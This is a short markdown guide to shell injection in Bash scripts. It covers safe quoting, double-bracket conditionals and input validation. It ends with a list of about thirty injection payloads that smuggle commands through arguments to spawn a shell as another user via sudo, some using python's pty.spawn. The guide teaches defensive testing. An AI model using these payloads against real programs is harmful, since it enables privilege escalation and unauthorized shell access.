# Shell Injection

A shell injection attack is a type of attack that allows arbitrary command
execution on a host.

It is a hazard that comes with bad shell scripting habits.

These types of attack mostly happen with command line arguments that are not 
parsed correctly, or variables being incorrectly used (e.g., unquoted).  

## Prevention/Safe Practices

Common examples are using `; shell-cmd` or using subshell syntax `$(...)` in command
line arguments to trick the shell into interpreting those commands.

If using Bash, a safe practice is to always use the double-bracket notation for
conditional statements:
```bash
if [[ $var -eq 0 ]]; then :; fi
```
Inside these double brackets `[[...]]`, all variables are inherently quoted and
treated as a single argument. No word splitting occurs using this syntax.  

This is distinct from using single bracket notation:
```bash
if [ $var -eq 0 ]; then :; fi
```
Here, `$var` (unquoted), may undergo word splitting. Word splitting is an
attack vector that can cause the subsequent arguments to be treated as commands
if the correct syntax is provided.  

If single brackets must be used (e.g., POSIX-compliant scripts), then ensure
variables are **always** double-quoted in any context.  

Another safe practice is to sanitize user input before using it in a shell
command. For example, if the script is taking user input for a date, check that
the provided input matches the required format.
```bash
declare date
# $date expects the format YYYY-MM-DD
if [[ "$1" =~ [[:digit:]]{4}-[[:digit:]]{2}-[[:digit:]]{2} ]]; then
    date="$1"
    shift
fi
```



## Examples of a Shell Injection

If you have a script or binary that runs with sudo, make sure you sanitize user
input before using it.  

That is, if you invkoke a command with CLI arguments without sanitizing them
or checking them in any way, your program may be susceptible to shell injection
attacks.  

Below is a set of shell injection attack examples, which can be used to test if
your program is subject to a shell injection attack.  
```bash
./bad-script '; sudo -u targetuser /bin/sh #'
./bad-script '&& sudo -u targetuser /bin/sh #'
./bad-script '|| sudo -u targetuser /bin/sh #'
./bad-script '$(sudo -u targetuser /bin/sh)'
./bad-script '`sudo -u targetuser /bin/sh`'
./bad-script '; sudo -u targetuser /bin/bash #'
./bad-script '&& sudo -u targetuser /bin/bash #'
./bad-script '|| sudo -u targetuser /bin/bash #'
./bad-script '$(sudo -u targetuser /bin/bash)'
./bad-script '`sudo -u targetuser /bin/bash`'
./bad-script '; sudo -u targetuser sh -c "sh" #'
./bad-script '&& sudo -u targetuser sh -c "sh" #'
./bad-script '|| sudo -u targetuser sh -c "sh" #'
./bad-script '$(sudo -u targetuser sh -c "sh")'
./bad-script '`sudo -u targetuser sh -c "sh"`'
./bad-script '; /bin/sh -c "sudo -u targetuser /bin/sh" #'
./bad-script '&& /bin/sh -c "sudo -u targetuser /bin/sh" #'
./bad-script '|| /bin/sh -c "sudo -u targetuser /bin/sh" #'
./bad-script '$(/bin/sh -c "sudo -u targetuser /bin/sh")'
./bad-script '`/bin/sh -c "sudo -u targetuser /bin/sh"`'
./bad-script '; sudo -u targetuser python -c "import pty; pty.spawn('/bin/sh')" #'
./bad-script '&& sudo -u targetuser python -c "import pty; pty.spawn('/bin/sh')" #'
./bad-script '|| sudo -u targetuser python -c "import pty; pty.spawn('/bin/sh')" #'
./bad-script '$(sudo -u targetuser python -c "import pty; pty.spawn('/bin/sh')")'
./bad-script '`sudo -u targetuser python -c "import pty; pty.spawn('/bin/sh')"`'
./bad-script '; sudo -u targetuser python3 -c "import pty; pty.spawn('/bin/sh')" #'
./bad-script '&& sudo -u targetuser python3 -c "import pty; pty.spawn('/bin/sh')" #'
./bad-script '|| sudo -u targetuser python3 -c "import pty; pty.spawn('/bin/sh')" #'
./bad-script '$(sudo -u targetuser python3 -c "import pty; pty.spawn('/bin/sh')")'
./bad-script '`sudo -u targetuser python3 -c "import pty; pty.spawn('/bin/sh')"`'
```

- These assume the binary unsafely concatenates or passes the argument directly 
  into a shell command without proper sanitization (e.g., using `system()`
  syscall, `popen()` syscall, or similar).  

- If the binary uses the `exec*()` family of system calls with proper `ARGV` 
  separation, command injection may not be possible.

- Also, these assume that the current user is allowed via sudoers to 
  run `sudo -u targetuser` commands without password, otherwise you'll
  be prompted or denied.
  
